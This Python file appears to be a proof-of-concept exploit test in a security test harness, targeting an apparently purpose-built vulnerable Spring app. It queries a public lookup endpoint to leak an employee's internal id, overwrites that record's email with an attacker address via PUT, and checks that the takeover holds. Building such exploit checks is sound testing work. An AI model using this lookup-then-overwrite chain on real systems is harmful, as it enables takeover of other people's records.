"""PoC exploit for the Spring employee ID oracle takeover chain."""

from mosaic.oracle.exploit import ExploitTest


class EmployeeIdOracleTakeoverExploit(ExploitTest):
    """Public lookup endpoint leaks employee id, enabling record takeover."""

    TARGET_EMAIL = "finance.contact@corp.internal"
    ATTACKER_EMAIL = "attacker@example.com"

    @property
    def chain_id(self) -> str:
        return "spring_employee_id_oracle_takeover"

    def setup(self) -> None:
        # Stage 1 seeds the employee directory on startup; no explicit fixture
        # endpoint is required for the exploit path.
        return None

    def execute(self) -> tuple[bool, str]:
        lookup = self.http_get("/api/employee/lookup", params={"emailId": self.TARGET_EMAIL})
        if lookup.status_code == 404:
            return False, "Lookup endpoint /api/employee/lookup returned 404."
        if not lookup.ok:
            return False, f"GET /api/employee/lookup failed with HTTP {lookup.status_code}: {lookup.text[:200]}"

        try:
            payload = lookup.json()
        except Exception:
            return False, f"Lookup endpoint did not return JSON: {lookup.text[:200]}"

        if not isinstance(payload, dict):
            return False, "Expected lookup endpoint to return a JSON object."

        employee_id = payload.get("id")
        if not employee_id:
            return False, f"Lookup endpoint did not expose id. Keys: {sorted(payload.keys())}"

        update_payload = {
            "id": employee_id,
            "name": "Bob Finance",
            "emailId": self.ATTACKER_EMAIL,
            "internalNotes": "compromised via lookup oracle",
        }
        update = self.http_put(f"/api/employee/{employee_id}", json=update_payload)
        if not update.ok:
            return False, f"PUT /api/employee/{employee_id} failed with HTTP {update.status_code}: {update.text[:200]}"

        verify = self.http_get(f"/api/employee/{employee_id}")
        if not verify.ok:
            return False, f"GET /api/employee/{employee_id} failed with HTTP {verify.status_code}: {verify.text[:200]}"

        try:
            verify_payload = verify.json()
        except Exception:
            return False, f"Could not parse verification JSON: {verify.text[:200]}"

        if not isinstance(verify_payload, dict):
            return False, "Expected verification endpoint to return a JSON object."

        if verify_payload.get("emailId") == self.ATTACKER_EMAIL:
            return True, (
                "Employee record takeover confirmed via ID oracle: "
                f"id={employee_id}, emailId={self.ATTACKER_EMAIL}"
            )

        return False, (
            "Employee id was exposed but the overwrite did not persist. "
            f"Verification payload keys: {sorted(verify_payload.keys())}"
        )
